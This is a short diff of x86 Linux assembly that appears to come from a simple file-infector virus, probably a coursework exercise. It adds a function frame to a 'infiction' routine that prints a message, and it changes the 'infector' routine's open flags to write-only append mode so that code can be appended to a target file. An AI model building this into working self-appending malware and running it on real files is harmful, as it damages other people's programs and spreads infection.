@@ -46,6 +46,8 @@ system_call:
 
 code_start:
     infiction:
+        push ebp              		; save Base Pointer (bp) original value
+        mov ebp, esp
         pushad
         mov eax , 4
         mov ebx ,1
@@ -53,6 +55,10 @@ code_start:
         mov edx ,len
         int 0x80
         popad
+        mov eax,0         		; return value 0 no error oucrired 
+        mov esp, ebp			; free function activation frame
+        pop ebp	
+        ret
 code_end:
 
 infector:
@@ -61,7 +67,7 @@ infector:
     pushad
     mov ebx, dword [ebp+8]
     mov eax,5
-    mov ecx,2
+    mov ecx,1025
     mov edx, 0777
     int 0x80
     mov ebx,eax
